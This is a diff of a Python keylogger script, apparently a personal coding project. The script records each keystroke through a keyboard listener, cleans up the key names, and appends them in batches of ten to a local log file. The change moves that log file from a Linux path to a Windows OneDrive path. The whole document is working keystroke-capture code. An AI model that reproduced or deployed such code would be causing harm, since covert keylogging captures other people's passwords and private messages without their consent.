@@ -9,20 +9,25 @@ import time
 # Constant for how many characters on the line before inserting a new line
 MAX_ON_LINE = 10
 NEW_LINE = 80
-# List to temporarily store the characters in a list
 key_counter = 0
 count_line = 0
+# List to temporarily store the characters in a list
 key_list = []
 
 #%%----------------------------------------------------------------------------
 # Listens to the key inputs from the keyboard
 def on_press(key):
+    # Variables and constants are used blobally for the whole program.
     global key_counter, key_list, MAX_ON_LINE, count_line
+    
     key_counter += 1
-    key_list.append(key)
     count_line += 1
-    write_file(key_list, count_line)
+    # Removes uneccassary quotation marks
+    key = str(key).replace("'","")
+    key_list.append(key)
+    # Write every "MAX_ON_LINE" to the file.
     if key_counter >= MAX_ON_LINE:
+        write_file(key_list, count_line)
         key_counter = 0
         key_list = []
 #%%----------------------------------------------------------------------------
@@ -54,9 +59,9 @@ def check_time():
 def write_file(key_list, count_line):
     global NEW_LINE
     # For Linux Directory
-    with open("/home/bladerunner/Documents/python/keylogger/log.txt",'a') as log:
+    #with open("/home/bladerunner/Documents/python/keylogger/log.txt",'a') as log:
     # For Windows Directory
-    #with open("E:\OneDrive - UNSW\Coding\python\keylogger\log.txt",'a') as log:
+    with open("E:\OneDrive - UNSW\Coding\python\keylogger\log.txt",'a') as log:
         # This appends to a file.
         # This loop will update the text file every 'x' amount of keys.
         if check_time() == True: 
@@ -66,7 +71,10 @@ def write_file(key_list, count_line):
                 count_line = 0
                 log.write("\n")
             
-            log.write(str(keys))
+            if keys == "Key.space" :
+                log.write(" ")
+            else:
+                log.write(str(keys))
 
 #%%----------------------------------------------------------------------------  
 # Collect events until released
